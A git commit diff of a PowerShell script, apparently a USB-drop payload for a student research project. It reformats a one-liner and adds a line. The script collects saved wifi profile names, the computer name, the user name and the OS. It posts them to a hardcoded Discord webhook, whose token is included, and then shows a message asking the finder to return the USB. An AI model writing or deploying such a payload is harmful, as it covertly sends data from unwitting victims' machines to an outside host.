f268bccb4b886f4dd8cdeba76f456c254f9e0133
Àngel <aparra1970@gmail.com>
2023-11-04 00:37:37 +0100

    Update trec-pl.ps1

--- trec-pl.ps1
+++ trec-pl.ps1
@@ -1,1 +1,8 @@
-$nw="**Xarxes wifi:**\r\n";netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {$wlan  = $_.Matches.Value;$nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";};Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1170142170838216744/WSpOKi2cpXc61h0Ync6Ff8UfxwittRG2OScStJsW6f-_91kzb58WdIxHKpOHqJL8G9W9" -Method Post -Body ('{"username": "MegaHacker - Foto1","avatar_url": "https://i.imgur.com/4M34hi2.png","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');[System.Windows.Forms.MessageBox]::Show("Hola, aquest missatge és part del treball de recerca de Joan, torna l'usb a consejeria. Gràcies per participar-hi!!!","Trec J04n");
+$nw="**Xarxes wifi:**\r\n";
+netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
+    $wlan  = $_.Matches.Value;
+    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
+  }
+Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1170142170838216744/WSpOKi2cpXc61h0Ync6Ff8UfxwittRG2OScStJsW6f-_91kzb58WdIxHKpOHqJL8G9W9" -Method Post -Body ('{"username": "MegaHacker - Foto1","avatar_url": "https://i.imgur.com/4M34hi2.png","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
+Add-Type -AssemblyName PresentationCore,PresentationFramework;
+[System.Windows.Forms.MessageBox]::Show("Hola, aquest missatge és part del treball de recerca de Joan, torna l'usb a consejeria. Gràcies per participar-hi!!!","Trec J04n");
